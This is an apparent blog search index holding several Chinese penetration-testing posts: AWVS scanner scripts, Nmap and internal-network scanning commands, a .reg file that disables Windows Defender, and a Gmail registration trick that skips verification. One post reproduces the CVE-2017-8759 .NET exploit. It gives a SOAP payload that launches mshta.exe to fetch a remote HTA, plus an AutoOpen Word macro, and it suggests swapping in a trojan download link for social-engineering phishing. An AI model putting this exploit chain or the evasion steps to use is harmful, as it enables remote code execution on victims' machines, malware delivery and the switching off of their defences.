<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[手工查看当前网站的HTTPSERVER信息]]></title>
    <url>%2F2017%2F09%2F20%2Flook-httpserver-method%2F</url>
    <content type="text"><![CDATA[简述 HTTPSERVER是每个网站搭建所用的web容器标识,例如常见:IIS、Apache、Nginx,今天教大家如何手工利用谷歌浏览器查看。 手工具体步骤1、打开谷歌浏览器 2、地址栏输入”www.shouyihuo.com”,这个Url是我随便找的 3、在页面空白处鼠标右键-检查/审查元素,然后网页页面的右边会弹出一个栏目 4、为了方便查看点击栏目x旁边竖着三个点，然后点击倒数第三个”Dock to boottom” 5、栏目就会到网页页面下方,在栏目菜单栏选择第三个”Network”浏览器刷新页面就会有一堆Url参数 6、我一般选择第一个链接点击进去,就可以看到当前Url的HTTPSERVER信息 结语此方法可以在所有浏览器使用,但是在操作步骤可能略有不同.]]></content>
      <categories>
        <category>技术问题解答</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
        <tag>httpserver信息</tag>
        <tag>网站</tag>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AWVS各类脚本]]></title>
    <url>%2F2017%2F09%2F18%2Facunetix-web-vulnerability-scanner-11%2F</url>
    <content type="text"><![CDATA[简述Acunetix Web Vulnerability Scanner是一个网站及服务器漏洞扫描软件，它包含有收费和免费两种版本。 启动&amp;停止脚本 下面代码复制另存为awvs.bat1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556@echo offmode con lines=30 cols=60clscolor 2fecho.-----------------------------------------------------------echo.请选择使用：echo.echo. 1.启动Awvs 11（即在下面输入1）echo.echo. 2.停止Awvs 11（即在下面输入2）echo.-----------------------------------------------------------if exist "%SystemRoot%\System32\choice.exe" goto Win7Choiceset /p choice=请输入数字并按回车键确认:echo.if %choice%==1 goto StartAwvsif %choice%==2 goto StopAwvscls"set choice="echo 您输入有误，请重新选择。goto main:Win7Choicechoice /c 12 /n /m "请输入相应数字："if errorlevel 2 goto StopAwvsif errorlevel 1 goto StartAwvsclsgoto main:StartAwvsclscolor 2fnet start Acunetixnet start "Acunetix Database"echo.-----------------------------------------------------------echo.echo 成功启动 "Acunetix"，"Acunetix Database" 服务！echo.goto end:StopAwvsclscolor 2fnet stop Acunetixnet stop "Acunetix Database"echo.-----------------------------------------------------------echo.echo 成功关闭 "Acunetix"，"Acunetix Database" 服务！echo.goto end:endecho 请按任意键退出。@Pause&gt;nul 批量添加扫描URL 该脚本为Python语言,使用前请安装Python. 1、将下列代码复制另存为”awvs11批量扫描删除.py” 2、全文搜索localhost:3443,全部替换为你awvs所在的服务器及端口 3、username填你的账户名,pw填你的密码,是sha256加密后的密码 4、把要添加的url列表保存成testawvs.txt文件，放在该脚本所在目录运行该脚本。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#-*- coding:utf-8 -*-import urllib2import sslimport json__author="jamesj"#localhost:3443全部替换为awvs所在的服务器及端口username='mail@mail.com'#账号邮箱pw='sha256加密后的密码'#sha256加密后的密码，通过burp抓包可获取,也可以使用(http://tool.oschina.net/encrypt?type=2)把密码进行加密之后填入，请区分大小写、中英文字符。#以上内容为配置内容，然后把要添加的url列表保存成testawvs.txt文件，放在该脚本下运行该脚本。ssl._create_default_https_context = ssl._create_unverified_contexturl_login="https://localhost:3443/api/v1/me/login"send_headers_login=&#123;'Host': 'localhost:3443','Accept': 'application/json, text/plain, */*','Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3','Accept-Encoding': 'gzip, deflate, br','Content-Type': 'application/json;charset=utf-8'&#125;data_login='&#123;"email":"'+username+'","password":"'+pw+'","remember_me":false&#125;'req_login = urllib2.Request(url_login,headers=send_headers_login)response_login = urllib2.urlopen(req_login,data_login)xauth = response_login.headers['X-Auth']COOOOOOOOkie = response_login.headers['Set-Cookie']print "当前验证信息如下\r\n cookie : %r \r\n X-Auth : %r "%(COOOOOOOOkie,xauth)send_headers2=&#123; 'Host':'localhost:3443', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Content-Type':'application/json;charset=utf-8', 'X-Auth':xauth, 'Cookie':COOOOOOOOkie &#125;#以上代码实现登录（获取cookie）和校验值def add_exec_scan(): url="https://localhost:3443/api/v1/targets" try: urllist=open('testawvs.txt','r')#这是要添加的url列表 formaturl=urllist.readlines() for i in formaturl: target_url='http://'+i.strip() data='&#123;"description":"222","address":"'+target_url+'","criticality":"10"&#125;' #data = urllib.urlencode(data)由于使用json格式所以不用添加 req = urllib2.Request(url,headers=send_headers2) response = urllib2.urlopen(req,data) jo=json.loads(response.read()) target_id=jo['target_id']#获取添加后的任务ID #print target_id #以上代码实现批量添加 url_scan="https://localhost:3443/api/v1/scans" headers_scan=&#123; 'Host': 'localhost:3443', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/json;charset=utf-8', 'X-Auth':xauth, 'Cookie':COOOOOOOOkie, &#125; data_scan='&#123;"target_id":'+'\"'+target_id+'\"'+',"profile_id":"11111111-1111-1111-1111-111111111111","schedule":&#123;"disable":false,"start_date":null,"time_sensitive":false&#125;,"ui_session_id":"66666666666666666666666666666666"&#125;' req_scan=urllib2.Request(url_scan,headers=headers_scan) response_scan=urllib2.urlopen(req_scan,data_scan) print response_scan.read()+"添加成功！" #以上代码实现批量加入扫描 urllist.close() except Exception,e: print edef count(): url_count="https://localhost:3443/api/v1/notifications/count" req_count=urllib2.Request(url_count,headers=send_headers2) response_count=urllib2.urlopen(req_count) print "当前存在%r个通知！" % json.loads(response_count.read())['count'] print "-" * 50 print "已存在以下任务" url_info="https://localhost:3443/api/v1/scans" req_info=urllib2.Request(url_info,headers=send_headers2) response_info=urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) num = 0 for website in all_info.get("scans"): num+=1 print website.get("target").get("address")+" \r\n target_id:"+website.get("scan_id") print "共 %r个扫描任务" % num #count()#scan、target、notification！def del_scan(): url_info="https://localhost:3443/api/v1/scans" req_info=urllib2.Request(url_info,headers=send_headers2) response_info=urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) counter = 0 for website in all_info.get("scans"): #if (website.get("target").get("description"))== "222": url_scan_del="https://localhost:3443/api/v1/scans/"+str(website.get("scan_id")) req_del = urllib2.Request(url_scan_del,headers=send_headers2) req_del.get_method =lambda: 'DELETE' response_del = urllib2.urlopen(req_del) counter = counter+1 print "已经删除第%r个!" % counter#del_scan() #通过描述判断是否使用扫描器添加扫描器添加的时候设置description=“222”def del_targets(): url_info="https://localhost:3443/api/v1/targets" req_info=urllib2.Request(url_info,headers=send_headers2) response_info=urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) for website in all_info.get("targets"): if (website.get("description"))== "222": url_scan_del="https://localhost:3443/api/v1/targets/"+str(website.get("target_id")) req_del = urllib2.Request(url_scan_del,headers=send_headers2) req_del.get_method =lambda: 'DELETE' response_del = urllib2.urlopen(req_del) print "ok!"#del_targets()if __name__== "__main__": print "*" * 20 count() print "1、使用testawvs.txt添加扫描任务并执行请输入1，然后回车\r\n2、删除所有使用该脚本添加的任务请输入2，然后回车\r\n3、删除所有任务请输入3，然后回车\r\n4、查看已存在任务请输入4，然后回车\r\n" choice = raw_input("&gt;")# print type(choice) if choice =="1": add_exec_scan() count() elif choice =="2": del_targets() count() elif choice =="3": del_scan() count() elif choice =="4": count() else: print "请重新运行并请输入1、2、3、4选择。"#下图的注释信息是删除通知。。""" counter= 0 for website in all_info.get("notifications"): if (website["data"].get("address")== "www.ly.com"): counter = counter + 1 url_del = "https://localhost:3443/api/v1/scans/"+str(website["data"].get("scan_id")) print url_del#print url_del req_del = urllib2.Request(url_del,headers=send_headers2) #DELETE方法 try: req_del.get_method = lambda:"DELETE" response1 = urllib2.urlopen(req_del) except: print "error" continue print counter #print response1.read() #for address in need_info["address"] # if addressdel_all()""" 点我下载awvs集合脚本 参考 awvs 11一键启动-停止脚本 awvs11批量添加扫描\删除小脚本]]></content>
      <categories>
        <category>神兵利器</category>
      </categories>
      <tags>
        <tag>acunetix web vulnerability scanner 11</tag>
        <tag>awvs11破解版版</tag>
        <tag>awvs11启动停止脚本</tag>
        <tag>awvs11批量扫描脚本</tag>
        <tag>漏洞扫描工具</tag>
        <tag>批处理脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows10关闭最新Windows Defender]]></title>
    <url>%2F2017%2F09%2F18%2Fwindows10-off-new-Windows-Defender%2F</url>
    <content type="text"><![CDATA[简述Windows Defender，曾用名Microsoft AntiSpyware，是用来移除、隔离和预防间谍软件的程序，可以运行在Windows XP以及更高版本的操作系统上，并已经内置在Windows Vista以及以后的版本中。测试版于2005年1月6日发布，在2005年6月23日、2006年2月17日微软又发布了更新的测试版本。Windows Defender的定义库更新很频繁。在Windows 8中与Microsoft Security Essentials集成。Windows Defender不像某些其他同类免费产品一样只能扫描系统，还可以对系统进行实时监控，移除已经安装的ActiveX插件，清除大多数微软的程序和其他常用程序的历史纪录。 组策略&amp;注册表关闭最新Windows Defender使用组策略关闭最新Windows Defender本地组策略编辑器仅在Windows 10 Pro，Enterprise和Education 版本中可用。 所有版本可以使用下面的注册表。 打开步骤:开始-运行[win+r]-输入gpedit.msc win+r=键盘windows图标+r键 打开右侧菜单栏选择计算机配置-管理模板-Windows 组件-Windows Defender 防病毒程序-关闭 Windows Defender 防病毒程序 默认是未配置,我先前启用了 选择已启用,点击确定,然后关闭组策略 使用注册表关闭最新Windows Defender使用REG文件打开或关闭Windows Defender Antivirus 下面的.reg文件将添加和修改下面的注册表项中的DWORD值。 HKEY_LOCAL_MACHINE \ SOFTWARE \ Policies \ Microsoft \ Windows Defender DisableAntiSpyware DWORD (delete) or 0 = On1 = Off 关闭Windows Defender Antivirus下面代码复制,新建文本文档将内容粘贴进去,保存并重命名为关闭windef.reg1234Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]"DisableAntiSpyware"=dword:00000001 开启Windows Defender Antivirus下面代码复制,新建文本文档将内容粘贴进去,保存并重命名为开启windef.reg1234Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]"DisableAntiSpyware"=- 点我下载:关闭和开启脚本 参考 Windows Defender Turn On or Off Windows Defender in Windows 10]]></content>
      <categories>
        <category>技术问题解答</category>
      </categories>
      <tags>
        <tag>win10</tag>
        <tag>删除最新Windows Defender</tag>
        <tag>关闭最新Windows Defender</tag>
        <tag>打开windows Defender</tag>
        <tag>删除杀毒软件</tag>
        <tag>组策略</tag>
        <tag>注册表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap 中文教程]]></title>
    <url>%2F2017%2F09%2F16%2FNmap-Chinese-Course%2F</url>
    <content type="text"><![CDATA[0x00 简述Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具，它是自由软件。软件名字Nmap是Network Mapper的简称。通常情况下，Nmap用于： 列举网络主机清单 管理服务升级调度 监控主机 服务运行状况 Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。Nmap 是不少黑客及脚本小孩爱用的工具 。系统管理员可以利用Nmap来探测工作环境中未经批准使用的服务器，黑客通常会利用Nmap来搜集目标电脑的网络设定，从而计划攻击的方法。Nmap通常用在信息搜集阶段，用于搜集目标机主机的基本状态信息。扫描结果可以作为漏洞扫描、漏洞利用和权限提升阶段的输入。例如，业界流行的漏洞扫描工具Nessus与漏洞利用工具Metasploit都支持导入Nmap的XML格式结果，而Metasploit框架内也集成了Nmap工具（支持Metasploit直接扫描）。Nmap不仅可以用于扫描单个主机，也可以适用于扫描大规模的计算机网络（例如，扫描英特网上数万台计算机，从中找出感兴趣的主机和服务）。 0x01 命令及参数介绍常见端口扫描 map [Scan Type(s)] [Options] {target specification}scan type(s) 用于指定扫描类型options 用于指定选项target specification 用于指定扫描目标 -s 指定扫描类型如下：-sP (ping扫描) 存活主机探测-sS (TCP SYN扫描 隐身扫描) 默认扫描方式-sT (tcp 扫描) syn 不能用时就tcp扫描-sU （UDP 扫描）-sA （ACK扫描） 三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用-sV （版本探测）-A 操作系统探测-O （启用操作系统检测）-v 详细选项说明：-P0 [指定端口] (无ping扫描)-PU [指定端口] (udp ping扫描)-PS [指定端口] (TCP SYN ping 扫描)-PA [指定端口] (tcp ack ping扫描)-PI 使用真正的pingICMP echo请求来扫描目标主机是否正在运行-iL 指定扫描主机列表-iR 随机选择目标–exclude 排除扫描目标–excludefile 排除文件中目标列表-n (不用域名解析)-R (为所有目标解析域名)-T 时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢-F 快速扫描-e 指定网络接口-M 设置tcp扫描线程 输出 -oS “1337格式” 保存扫描结果输出-oN 把扫描结果重定向到一个可读的文件logfilename中-oM 每个结果一行输出-oA 同上–append-output 附在原来的结果前面 Nmap端口6个状态 open（开放的）closed（关闭的）filtered（被过滤的）不确定开放还是关闭unfiltered （未被过滤的）openfiltered （开放或者被过滤的）closedfiltered （关闭或者未被过滤的） 使用实例获取远程主机的系统类型及开放端口 nmap -sS -P0 -sV -O 获取ip和mac地址： nmap -sP -PI -PT -oN 192.168.1.0/24 扫描存活主机 nmap -sP -n 192.168.10.0/24 | cut -d” “ -f5 | awk “/192/“ windows: 1nmap -sP -n 192.168.10.0/24 | find "192" &gt;tmp_active001&amp;for /f "tokens=1,2,3,4,5" %i in (tmp_active001)do @echo %m 漏洞探测漏洞脚本根据Nmap,GitHub官方项目script文件夹下查看:https://github.com/nmap/nmap/tree/master/scripts nmap -P0 –script=smb-check-vulns –script-args=unsafe=1 -iL ip.txt 扫描常见端口:1nmap -sT -O -P0 -T5 --open -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 63.237.172.115/24 21 ftp 主要看是否支持匿名，也可以跑弱口令80 web 常见web漏洞以及是否为一些管理后台443 openssl 心脏滴血以及一些web漏洞测试873 rsync 主要看是否支持匿名，也可以跑弱口令2601,2604 zebra路由，默认密码zebra3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网6379 redis 一般无认证，可直接访问8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上9200 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞11211 memcache 未授权访问27017 mongodb 未授权访问28017 mongodb统计页面 扫描巨大网络 -sn 不扫描端口，只ping主机-PE 通过ICMP echo判定主机是否存活-n 不反向解析IP地址到域名–min-hostgroup 1024 最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描–min-parallelism 1024 这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024-oX nmap_output.xml 将结果以XML格式输出，文件名为nmap_output.xml 扫描结束，解析XML文档即可得到哪些IP地址存活. 附上自己平时用的nmap命令，由于之前发包太大vps被封过一次，所以加了一些限速的参数 1nmap -sT -sV -O -P0 --open -n -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 -iL ip.txt 1nmap -sT -sV -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 --open --max-hostgroup 10 --max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt WindoWs自带命令端口扫描及powershellbat批量ping获取iP1234567@echo offsetlocal ENABLEDELAYEDEXPANSION@FOR /F "usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "命令成功完成" /v ^|find "The command completed successfully." /v`) DO (@FOR /F "usebackq delims=" %%i IN (`@ping -n 1 -4 %%j ^| findstr "Pinging"`) DO (@FOR /F "usebackq tokens=2 delims=[]" %%k IN (`echo %%i`) DO (echo %%k %%j))) 内网无工具扫描一条 cmd 命令解决： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i “ttl”ping 整个 c 段，只输出有响应的主机。 % H” g% Q+ _6 q- P7 t更变态的： 4 o4 g8 X- v9 x&amp; w域机器对应 IP FOR /F “eol=- tokens=1 delims=\ “ %a IN (‘net view’) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 |find /i “ttl” &amp; echo.)把 net view 的结果，挨个 ping 一遍，并输出机器名和 ip 地址。 找主机名 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”B 段查找 for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”Win7 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”改成 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Ping”for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Ping”就可以兼容 Win7 了。（Win7 ping -a 输出结果关键词为 “Ping”） 另外findstr /i “pinging” 或 findstr /i “ping” 可以换成 findstr “[” 的 可以适合多语言环境 PowerShell_IPv4NetworkScannerSyntax12345.\IPv4NetworkScan.ps1 [-StartIPv4Address] &lt;IPAddress&gt; [-EndIPv4Address] &lt;IPAddress&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;].\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-Mask] &lt;String&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;].\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-CIDR] &lt;Int32&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;] Example 112345PS&gt; .\IPv4NetworkScan.ps1 -StartIPv4Address 192.168.178.0 -EndIPv4Address 192.168.178.20IPv4Address Status Hostname----------- ------ --------192.168.178.1 Up fritz.box Example 2123456PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address 192.168.178.0 -Mask 255.255.255.0 -DisableDNSResolvingIPv4Address Status----------- ------192.168.178.1 Up192.168.178.22 Up Example 3123456PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address 192.168.178.0 -CIDR 25 -EnableMACResolvingIPv4Address Status Hostname MAC Vendor----------- ------ -------- --- ------192.168.178.1 Up fritz.box XX-XX-XX-XX-XX-XX AVM Audiovisuelles Marketing und &gt;Computersysteme GmbH192.168.178.22 Up XXXXX-PC.fritz.box XX-XX-XX-XX-XX-XX ASRock Incorporation 下载链接: https://github.com/BornToBeRoot/PowerShell_IPv4NetworkScanner.git 结语建议大家在内网渗透中尽量使用内网无工具或PowerShell进行端口探测与扫描,防止防火墙报警、拦截 参考文章 nmap语法 内网渗透测试定位技术总结]]></content>
      <categories>
        <category>渗透教程</category>
      </categories>
      <tags>
        <tag>渗透教程</tag>
        <tag>nmap中文教程</tag>
        <tag>端口扫描</tag>
        <tag>漏洞扫描</tag>
        <tag>内网渗透</tag>
        <tag>漏洞利用</tag>
        <tag>防火墙</tag>
        <tag>powershell端口扫描</tag>
        <tag>bat端口扫描</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-8759-微软.net远程代码执行漏洞复现]]></title>
    <url>%2F2017%2F09%2F14%2FCVE-2017-8759-Exploit%2F</url>
    <content type="text"><![CDATA[基本信息漏洞名称：.NET Framework远程代码执行漏洞漏洞编号：CVE-2017-8759漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统利用场景：远程钓鱼、社会工程（打开有惊喜哟）影响版本：以下.NET版本 Microsoft .NET Framework 4.6.2 Microsoft .NET Framework 4.6.1 Microsoft .NET Framework 3.5.1 Microsoft .NET Framework 4.7 Microsoft .NET Framework 4.6 Microsoft .NET Framework 4.5.2 Microsoft .NET Framework 3.5 Microsoft .NET Framework 2.0 SP2影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint加固方法：软件类漏洞，微软补丁会悄悄地告诉你https://portal.msrc.microsoft.com/en-us/security-guidance 利用过程简述 本次测试环境:Windows 2007 x64、Kali Linux X64、Python、Office Word 2016 X64 本次测试攻击利用Word宏,其他方法暂未测试. 从GitHub下载文件git clone https://github.com/Voulnet/CVE-2017-8759-Exploit-sample.git 修改文件夹exploit.txt内容&lt;soap:address location=&quot;http://127.0.0.1:8080?C:\Windows\System32\mshta.exe?http://127.0.0.1:8080/cmd.hta&quot;/&gt; soap标签内的ip地址替换成你的Web服务器地址 修改cmd.hta内容本次不做修改,仅做测试[替换标注内容为木马下载链接或其他姿势进行远程攻击] 启动Http服务器python -m SimpleHTTPServer 8080 新建word文档 可以利用从GitHub下载的word直接修改宏,在这里我给大家直接新建演示一次. 新建一个格式为doc的文档,内容自定义主要目的是利用社工诱导用户打开文档及相信该文档是正常文档未涉及钓鱼攻击. 新建宏步骤:视图-宏-宏名”AutoOpen”-创建,输入代码为: Sub AutoOpen() Set x = GetObject(&quot;soap:wsdl=http://127.0.0.1:8080/exploit.txt&quot;) End Sub 同样上面的IP替换你的Http服务器地址 Ctrl+s保存一下,然后点右上角的word图标返回到word界面. 运行结果由于我先前测试时启用了宏,所以没有提示,首次运行会提示需要启用宏.打开文档会生成三个文件在当前路径下. 参考文章 微软.NET远程代码执行漏洞0day分析(社工钓鱼) CVE-2017-8759-Weaponisation Tutorial CVE2017-8759 - RTF WSDL SOAP Parser Vulnerability 1-day]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
        <tag>exploit</tag>
        <tag>cve-2017-8759</tag>
        <tag>微软漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[匿名注册谷歌邮箱[实测可用]]]></title>
    <url>%2F2017%2F09%2F13%2Fanonymous-register-gmail%2F</url>
    <content type="text"><![CDATA[不需要邮箱验证，不需要手机验证 注册步骤: 从 www.gmail.com 入口，点击注册。 姓氏要手打。（No老师说的） 电话区域的区号选择 特克斯和凯科斯群岛 (Turks &amp; Caicos Islands) 邮件区域不用填写 地区选择 特里斯坦-达库尼亚群岛 (Tristan da Cunha) 测试结果:需使用香港未注册gmail账户的Ss&amp;Vpn,才能注册成功,不建议批量注册及频繁注册 参考文章 匿名注注册Google邮箱]]></content>
      <categories>
        <category>福利</category>
      </categories>
      <tags>
        <tag>匿名注册谷歌邮箱</tag>
        <tag>香港Vpn</tag>
        <tag>Gmail</tag>
      </tags>
  </entry>
</search>
